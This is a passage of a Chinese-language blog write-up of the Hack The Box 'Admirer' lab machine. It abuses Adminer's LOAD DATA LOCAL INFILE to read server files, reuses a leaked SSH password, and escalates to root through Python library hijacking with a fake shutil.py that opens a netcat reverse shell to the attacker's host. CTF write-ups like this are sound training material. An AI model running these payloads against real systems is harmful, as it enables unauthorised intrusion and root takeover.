+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -h localhost -u demo -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 42</span><br><span class="line">Server version: 10.3.22-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure>
+<p>成功登录，在adminer页面远程登录：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521155908.png" alt=""></p>
+<p>It Work！！！</p>
+<p>验证能否使用<code>load data infile</code>语句读取文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load data local infile &#39;&#x2F;etc&#x2F;passwd&#39;</span><br><span class="line">into table test</span><br><span class="line">fields terminated by &quot;&#x2F;n&quot;</span><br></pre></td></tr></table></figure>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521160523.png" style="zoom:67%;" />
+<p>看一下phpinfo()：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521160942.png" alt=""></p>
+<p><code>open_basedir</code>限制了根路径，尝试读取<code>index.php</code>文件：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521163446.png" style="zoom:67%;" />
+<p>读取成功，用Select语句显示：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521163826.png" alt=""></p>
+<p>得到<code>waldo: &amp;&lt;h5b~yK3F#&#123;PaPB&amp;dA&#125;&#123;H&gt;</code>凭证用来登录SSH</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ ssh waldo@10.10.10.187</span><br><span class="line">waldo@10.10.10.187&#39;s password: </span><br><span class="line">Linux admirer 4.9.0-12-amd64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">The programs included with the Devuan GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Devuan GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3</span><br><span class="line">waldo@admirer:~$ id</span><br><span class="line">uid&#x3D;1000(waldo) gid&#x3D;1000(waldo) groups&#x3D;1000(waldo),1001(admins)</span><br><span class="line">waldo@admirer:~$ cat user.txt </span><br><span class="line">7222------------------------2c18</span><br></pre></td></tr></table></figure>
+<h3 id="Getting-Root-Access">Getting Root Access</h3>
+<p>查看waldo能运行的脚本或程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> waldo on admirer:</span><br><span class="line">    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always</span><br><span class="line"></span><br><span class="line">User waldo may run the following commands on admirer:</span><br><span class="line">    (ALL) SETENV: /opt/scripts/admin_tasks.sh</span><br></pre></td></tr></table></figure>
+<p>admin_tasks.sh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">view_uptime()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/uptime -p</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_users()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/w</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">view_crontab()</span><br><span class="line">&#123;</span><br><span class="line">    /usr/bin/crontab -l</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_passwd()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/passwd to /var/backups/passwd.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/passwd /var/backups/passwd.bak</span><br><span class="line">        /bin/chown root:root /var/backups/passwd.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/passwd.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_shadow()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Backing up /etc/shadow to /var/backups/shadow.bak...&quot;</span></span><br><span class="line">        /bin/cp /etc/shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chown root:shadow /var/backups/shadow.bak</span><br><span class="line">        /bin/chmod 600 /var/backups/shadow.bak</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Done.&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_web()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running backup script in the background, it might take a while...&quot;</span></span><br><span class="line">        /opt/scripts/backup.py &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">backup_db()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EUID</span>&quot;</span> -eq 0 ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running mysqldump in the background, it may take a while...&quot;</span></span><br><span class="line">        <span class="comment">#/usr/bin/mysqldump -u root admirerdb &gt; /srv/ftp/dump.sql &amp;</span></span><br><span class="line">        /usr/bin/mysqldump -u root admirerdb &gt; /var/backups/dump.sql &amp;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Insufficient privileges to perform the selected operation.&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Non-interactive way, to be used by the web interface</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 1 ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    option=<span class="variable">$1</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$option</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ;;</span><br><span class="line">        2) view_users ;;</span><br><span class="line">        3) view_crontab ;;</span><br><span class="line">        4) backup_passwd ;;</span><br><span class="line">        5) backup_shadow ;;</span><br><span class="line">        6) backup_web ;;</span><br><span class="line">        7) backup_db ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive way, to be called from the command line</span></span><br><span class="line">options=(<span class="string">&quot;View system uptime&quot;</span></span><br><span class="line">         <span class="string">&quot;View logged in users&quot;</span></span><br><span class="line">         <span class="string">&quot;View crontab&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup passwd file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup shadow file&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup web data&quot;</span></span><br><span class="line">         <span class="string">&quot;Backup DB&quot;</span></span><br><span class="line">         <span class="string">&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[[[ System Administration Menu ]]]&quot;</span></span><br><span class="line">PS3=<span class="string">&quot;Choose an option: &quot;</span></span><br><span class="line">COLUMNS=11</span><br><span class="line">select opt <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">case</span> <span class="variable">$REPLY</span> <span class="keyword">in</span></span><br><span class="line">        1) view_uptime ; <span class="built_in">break</span> ;;</span><br><span class="line">        2) view_users ; <span class="built_in">break</span> ;;</span><br><span class="line">        3) view_crontab ; <span class="built_in">break</span> ;;</span><br><span class="line">        4) backup_passwd ; <span class="built_in">break</span> ;;</span><br><span class="line">        5) backup_shadow ; <span class="built_in">break</span> ;;</span><br><span class="line">        6) backup_web ; <span class="built_in">break</span> ;;</span><br><span class="line">        7) backup_db ; <span class="built_in">break</span> ;;</span><br><span class="line">        8) <span class="built_in">echo</span> <span class="string">&quot;Bye!&quot;</span> ; <span class="built_in">break</span> ;;</span><br><span class="line"></span><br><span class="line">        *) <span class="built_in">echo</span> <span class="string">&quot;Unknown option.&quot;</span> &gt;&amp;2</span><br><span class="line">    <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>
+<p>在几个需要root权限运行的函数中，<code>backup_web()</code>调用了同目录下的<code>backup.py</code>脚本文件。</p>
+<p><a target="_blank" rel="noopener" href="http://backup.py">backup.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shutil <span class="keyword">import</span> make_archive</span><br><span class="line"></span><br><span class="line">src = <span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># old ftp directory, not used anymore</span></span><br><span class="line"><span class="comment">#dst = &#x27;/srv/ftp/html&#x27;</span></span><br><span class="line"></span><br><span class="line">dst = <span class="string">&#x27;/var/backups/html&#x27;</span></span><br><span class="line"></span><br><span class="line">make_archive(dst, <span class="string">&#x27;gztar&#x27;</span>, src)</span><br></pre></td></tr></table></figure>
+<p>这里引用了shutil模块中的<code>make_archive</code>函数，这个地方得用Python库劫持的方法提权：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></p>
+</blockquote>
+<p>查看当前Python库的路径：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:&#x2F;opt&#x2F;scripts$ python3 -c &#39;import sys; print (&quot;\n&quot;.join(sys.path))&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python35.zip</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;plat-x86_64-linux-gnu</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3.5&#x2F;lib-dynload</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.5&#x2F;dist-packages</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages</span><br></pre></td></tr></table></figure>
+<p>但是我们都没有权限写入文件到这些路径，但是我们可以使用<code>PYTHONPATH</code>来临时更改Python库的路径</p>
+<p>首先伪造一个shutil.py库文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:&#x2F;opt&#x2F;scripts$ cd</span><br><span class="line">waldo@admirer:~$ mkdir fakelib</span><br><span class="line">waldo@admirer:~$ cd fakelib&#x2F;</span><br><span class="line">waldo@admirer:~&#x2F;fakelib$ nano shutil.py </span><br><span class="line">waldo@admirer:~&#x2F;fakelib$ cat shutil.py </span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def make_archive(a, b, c):</span><br><span class="line">    os.system(&quot;nc 10.10.14.4 1234 -e &#39;&#x2F;bin&#x2F;sh&#39;&quot;)</span><br></pre></td></tr></table></figure>
+<p>靶机运行脚本文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">waldo@admirer:~/fakelib$ sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh </span><br><span class="line">[sudo] password <span class="keyword">for</span> waldo: </span><br><span class="line"></span><br><span class="line">[[[ System Administration Menu ]]]</span><br><span class="line">1) View system uptime</span><br><span class="line">2) View logged <span class="keyword">in</span> users</span><br><span class="line">3) View crontab</span><br><span class="line">4) Backup passwd file</span><br><span class="line">5) Backup shadow file</span><br><span class="line">6) Backup web data</span><br><span class="line">7) Backup DB</span><br><span class="line">8) Quit</span><br><span class="line">Choose an option: 6</span><br><span class="line">Running backup script <span class="keyword">in</span> the background, it might take a <span class="keyword">while</span>...</span><br></pre></td></tr></table></figure>
+<p>本机上监听1234端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 1234</span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">connect to [10.10.14.4] from (UNKNOWN) [10.10.10.187] 58946</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br><span class="line">root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@admirer:&#x2F;home&#x2F;waldo&#x2F;fakelib# cd   </span><br><span class="line">cd</span><br><span class="line">root@admirer:~# cat root.txt</span><br><span class="line">cat root.txt</span><br><span class="line">c6af------------------------4645</span><br></pre></td></tr></table></figure>
+<p>ROOTED！！！</p>
+<h2 id="0x04-Summary">0x04 Summary</h2>
+<ul>
+<li>nmap扫描出 <code>admin-dir</code>目录，访问发现403 Forbidden</li>
+<li>使用wfuzz工具扫描出 <code>contacts.txt</code> 和<code>credentials.txt</code>两个文件</li>
+<li>用<code>credentials.txt</code>文件暴露出来的FTP用户名和密码登录靶机FTP服务</li>
+<li>下载<code>dump.sql</code>文件和<code>html.tar.gz</code>并解压</li>
+<li><code>utility-scripts</code>目录中有MySQL的登录名和密码</li>
+<li>wfuzz<code>utility-scripts</code>目录发现 <code>adminer.php</code></li>
+<li>上面用户名和密码不能登录adminer</li>
+<li>Google发现一个adminer漏洞的公开利用方式</li>
+<li>在本地运行MySQL服务，并且新建用户允许任意主机接入，配置MySQL外部可访问</li>
+<li>用靶机的adminer服务连接本地数据库</li>
+<li>将index.php写入本地数据库</li>
+<li>得到waldo的用户名和密码，用SSH登录</li>
+<li>拿到<code>user.txt</code></li>
+<li>运行<code>sudo -l</code>命令，查看有权限执行的脚本<code>admin_task.sh</code></li>
+<li><code>admin_task.sh</code>会调用<code>backup.py</code></li>
+<li><code>Python</code> <strong>library</strong> <code>path</code> <strong>hijacking</strong> 提权</li>
+<li>伪造<code>shutil.py</code>，写入reverse shell</li>
+<li>sudo运行<code>admin_task.sh</code>时指定 <code>PYTHONPATH</code></li>
+<li>拿到 <code>root.txt</code></li>
+</ul>
+<h2 id="0x05-Reference">0x05 Reference</h2>
+<table>
+<thead>
+<tr>
+<th>Topic</th>
+<th>Url</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Adminer-database Manager</td>
+<td><a target="_blank" rel="noopener" href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></td>
+</tr>
+<tr>
+<td>Adminer-Database Manager</td>
+<td><a target="_blank" rel="noopener" href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability">https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability</a></td>
+</tr>
+<tr>
+<td>Configuration of Mysql</td>
+<td><a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql">https://www.digitalocean.com/community/tutorials/how-to-allow-remote-access-to-mysql</a></td>
+</tr>
+<tr>
+<td>Configuration of Mysql</td>
+<td><a target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql">https://www.digitalocean.com/community/tutorials/how-to-create-a-new-user-and-grant-permissions-in-mysql</a></td>
+</tr>
+<tr>
+<td>Python Path Hijacting</td>
+<td><a target="_blank" rel="noopener" href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/">https://rastating.github.io/privilege-escalation-via-python-library-hijacking/</a></td>
+</tr>
+</tbody>
+</table>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image 
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="c"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div> -->
+
+    <!-- Author title
+    <div class="author-title">
+      <div>ca01h</div>
+      <div>2020-05-21</div>
+    </div> -->
+	
+	<script src="https://www.hackthebox.eu/badge/212159"></script>
+  </div> 
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+	  <i class="fas fa-folder-open"></i>&nbsp;
+      <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>
+	  </br>
+	  <i class="fas fa-tags"></i>&nbsp;
+      <a class="tag-none-link" href="/tags/HTB/" rel="tag">#HTB</a> <a class="tag-none-link" href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag">#靶机</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+	  
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+<div align="center">
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv">Copyright © ca01h 2019-2020 | 本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+<!-- <span class="post-meta-divider">|</span> -->
+<!-- <span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"></span>人</span> -->
+</div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
+
+
+
+<script src="/js/book.js"></script>
